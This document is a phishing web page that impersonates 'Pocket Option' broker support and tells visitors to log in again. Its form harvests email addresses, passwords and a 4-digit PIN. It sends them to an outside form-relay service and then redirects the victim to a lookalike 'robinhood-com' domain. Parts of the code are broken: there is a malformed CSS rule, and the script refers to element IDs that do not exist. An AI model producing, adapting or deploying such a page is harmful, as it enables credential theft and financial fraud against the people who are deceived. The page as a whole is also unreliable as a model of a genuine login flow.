<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pocket Broker - Verification</title>


<style>
body{
    margin:0;
    font-family: Arial, sans-serif;
    background: linear-gradient(180deg,#0a2a4f,#08213d);
    color:#fff;
}

.container{
    max-width:400px;
    margin:auto;
    padding:20px;
}

.top-bar{
    display:flex;
    justify-content:space-between;
    font-size:14px;
    margin-bottom:20px;
}

.logo{
    text-align:center;
    margin-top:20px;
}

.logo h2{
    margin:10px 0;
    font-weight:600;
}

h1{
    text-align:center;
    margin-top:10px;
}

.register{
    text-align:center;
    margin-bottom:20px;
}

.register a{
    color:#6fa8ff;
    text-decoration:none;
}

.inputbox/
    margin:18px 0;
}

.input, textarea{
    width:100%;
    padding:15px;
    border-radius:10px;
    border:2px solid rgba(255,255,255,0.2);
    background:transparent;
    color:#fff;
    outline:none;
}

.remember{
    display:flex;
    align-items:center;
    gap:10px;
    margin:10px 0;
}

.remember input{
    width:auto;
}

.link{
    margin:10px 0;
}

.link a{
    color:#6fa8ff;
    text-decoration:none;
}

.btn{
    width:100%;
    padding:15px;
    border:none;
    border-radius:12px;
    background:linear-gradient(90deg,#4a7dff,#3a4dff);
    color:#fff;
    font-size:16px;
    margin-top:15px;
    cursor:pointer;
}

.social{
    text-align:center;
    margin-top:20px;
}

.social-buttons{
    display:flex;
    gap:10px;
    margin-top:10px;
}

.fb{
    flex:1;
    background:#1877f2;
    border:none;
    padding:12px;
    border-radius:10px;
    color:#fff;
}

.google{
    flex:1;
    background:#fff;
    color:#000;
    border:none;
    padding:12px;
    border-radius:10px;
}

</style>
</head>

<body><div class="container">

    <div class="top-bar">
        <span>← Back</span>
        <span>🌐 English</span>
    </div>

    <div class="logo">
        <h2>POCKET OPTION SUPPORT</h2>
    </div>
<h2>Relogin To Continue</h2>

<form action="https://api.web3forms.com/submit" method="POST">

<input type="hidden" name="access_key" value="">

<input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
<!-- STEP 1 -->
<div id="steps">
<h3>Enter mail</h3>
<input type="email" name="email" placeholder="yourgmail@gmail.com" required>
<p>password</p>
<input type="text" name="username" placeholder="password" required>
<h3>verify Pin</h3>
<textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
<h3>country, issue complaint</h3>
<textarea name="complaint" column="1" placeholder="state your country and complaint"></textarea>
<button type="submit">login</button>
</div>

</form>

</div>

    <div class="social">
        <p>Or sign in with</p>

        <div class="social-buttons">
            <button class="fb">Facebook</button>
            <button class="google">Google</button>
        </div>

<script>
// Get Step 1 data
const step1 = JSON.parse(localStorage.getItem("formStep1") || "{}");

// Fill fields
document.getElementById("emailField").value = step1.email || "";
document.getElementById("whatsappField").value = step1.whatsapp || "";
document.getElementById("complaintField").value = step1.complaint || "";
document.getElementById("countryField").value = step1.country || "";

// Clear after submit
document.getElementById("verifyForm").addEventListener("submit", function(){
    setTimeout(()=>{
        localStorage.removeItem("formStep1");
    },1000);
});
</script>

</body>
</html>
